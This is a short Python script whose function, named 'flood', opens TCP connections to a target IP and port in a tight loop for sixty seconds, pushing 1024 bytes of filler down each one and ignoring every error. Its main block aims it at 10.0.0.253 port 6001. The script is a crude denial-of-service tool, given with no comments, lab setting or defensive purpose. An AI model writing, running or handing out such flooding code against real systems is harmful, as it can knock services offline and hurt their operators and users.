import socket, time

def flood(dest_ip, dest_port, duration=60):
    end = time.time() + duration
    while time.time() < end:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((dest_ip, dest_port))
            sock.sendall(b'A' * 1024)
            sock.close()
        except:
            pass

if __name__ == "__main__":
    flood("10.0.0.253", 6001)
